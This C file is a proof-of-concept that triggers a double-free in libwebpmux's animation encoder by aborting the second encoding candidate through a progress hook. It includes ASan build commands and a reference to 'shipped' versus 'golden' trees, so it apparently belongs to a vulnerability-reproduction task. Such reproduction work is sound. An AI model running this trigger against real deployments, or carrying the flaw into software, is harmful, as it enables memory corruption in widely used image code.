// PoC: double-free in libwebpmux animation encoder when a user progress_hook
// aborts the second compression candidate of a keyframe.
//
// Public-API usage only: WebPAnimEncoderNew + WebPAnimEncoderAdd with a frame
// carrying a progress_hook (a documented, in-contract feature used to let the
// caller abort encoding). The first candidate (lossless) of the first frame is
// encoded successfully and its bitstream buffer is aliased into the keyframe
// slot of the cached frame; the second candidate (lossy) is aborted by the
// progress_hook, which drives SetFrame() down its error path.
//
// Build (links against the libwebp(mux) static libs built with ASan):
//   cc -I src -fsanitize=address -g -O1 pocs/residual.c \
//      build-asan/libwebpmux.a build-asan/libwebp.a build-asan/libsharpyuv.a \
//      -lm -o /tmp/residual
//   /tmp/residual
//
// Fires (ASan double-free / use-after-free abort) on the shipped tree.
// Runs cleanly on the golden (upstream-fixed) tree.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "webp/encode.h"
#include "webp/mux.h"

// Abort the second encode of the frame. We track encode sessions by watching
// the progress percentage reset (a new WebPEncode() starts low again after the
// previous one reached a high value). The first candidate is allowed to
// complete; the second is aborted at its first progress callback.
static int g_session = 0;
static int g_last = -1;
static int ProgressHook(int percent, const WebPPicture* picture) {
  (void)picture;
  if (percent < g_last) ++g_session;  // a new encode session started
  g_last = percent;
  if (g_session >= 1) return 0;       // abort the 2nd candidate
  return 1;
}

int main(void) {
  const int W = 64, H = 64;
  WebPAnimEncoderOptions anim_options;
  WebPAnimEncoder* enc;
  WebPConfig config;
  WebPPicture frame;
  int x, y, ok;

  if (!WebPAnimEncoderOptionsInit(&anim_options)) return 2;
  // Force both lossless and lossy candidates to be evaluated for each frame so
  // that a second candidate exists to be aborted.
  anim_options.allow_mixed = 1;
  anim_options.minimize_size = 1;
  anim_options.verbose = 0;

  enc = WebPAnimEncoderNew(W, H, &anim_options);
  if (enc == NULL) return 2;

  if (!WebPConfigInit(&config)) return 2;
  config.lossless = 1;
  config.quality = 75.0f;

  if (!WebPPictureInit(&frame)) return 2;
  frame.use_argb = 1;
  frame.width = W;
  frame.height = H;
  if (!WebPPictureAlloc(&frame)) return 2;

  // Fill with an opaque gradient so the frame is non-empty and both candidates
  // actually run a full encode.
  for (y = 0; y < H; ++y) {
    for (x = 0; x < W; ++x) {
      const uint32_t a = 0xffu;
      const uint32_t r = (uint32_t)((x * 255) / W);
      const uint32_t g = (uint32_t)((y * 255) / H);
      const uint32_t b = (uint32_t)(((x + y) * 255) / (W + H));
      frame.argb[y * frame.argb_stride + x] =
          (a << 24) | (r << 16) | (g << 8) | b;
    }
  }

  // Install the aborting progress hook. This is a normal, documented input.
  frame.progress_hook = ProgressHook;

  // The first frame is always encoded as a keyframe: the aliased winner lands
  // in encoded_frame->key_frame.bitstream.
  ok = WebPAnimEncoderAdd(enc, &frame, /*timestamp=*/0, &config);
  fprintf(stderr, "WebPAnimEncoderAdd returned %d (expected 0: user abort)\n",
          ok);

  WebPPictureFree(&frame);
  WebPAnimEncoderDelete(enc);
  return 0;
}
